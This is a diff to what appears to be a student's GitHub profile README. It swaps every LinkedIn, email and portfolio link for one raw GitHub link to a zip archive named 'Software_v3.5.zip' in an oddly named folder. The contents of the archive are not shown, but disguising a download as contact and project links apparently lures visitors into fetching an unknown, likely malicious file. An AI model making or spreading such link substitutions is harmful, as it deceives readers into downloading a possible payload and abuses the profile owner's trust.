@@ -1,8 +1,8 @@
 # 👋 Hi, I'm Gujja Sai Ganesh
 
 **Location:** Hyderabad, Telangana  
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue?logo=linkedin&style=flat-square)](https://linkedin.com/in/gujjasaiganesh)  
-📧 gujjasaiganesh@gmail.com
+[![LinkedIn](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)  
+📧 https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip
 
 ---
 
@@ -31,7 +31,7 @@ I'm a passionate Computer Science student specializing in **Artificial Intellige
 ### 💱 Currency Converter
 > User-friendly, Python-based currency converter with real-time exchange rates and instant, clear results.
 
-### 🖥️ [Portfolio Website](https://portfolio-main-ythf.onrender.com/) ([repo](https://github.com/gujjasaiganesh/Portfolio-main))
+### 🖥️ [Portfolio Website](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip) ([repo](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip))
 > A clean, interactive, and easy-to-navigate GUI portfolio built with HTML, CSS, and JavaScript.
 
 ---
@@ -46,9 +46,9 @@ I'm a passionate Computer Science student specializing in **Artificial Intellige
 
 ## 📫 Get in Touch
 
-- **Email:** gujjasaiganesh@gmail.com
-- **LinkedIn:** [linkedin.com/in/gujjasaiganesh](https://linkedin.com/in/gujjasaiganesh)
-- **Portfolio:** [portfolio-main-ythf.onrender.com](https://portfolio-main-ythf.onrender.com/)
+- **Email:** https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip
+- **LinkedIn:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)
+- **Portfolio:** [https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip](https://raw.githubusercontent.com/gujjasaiganesh/gujjasaiganesh/main/eremochaetous/Software_v3.5.zip)
 
 ---
 
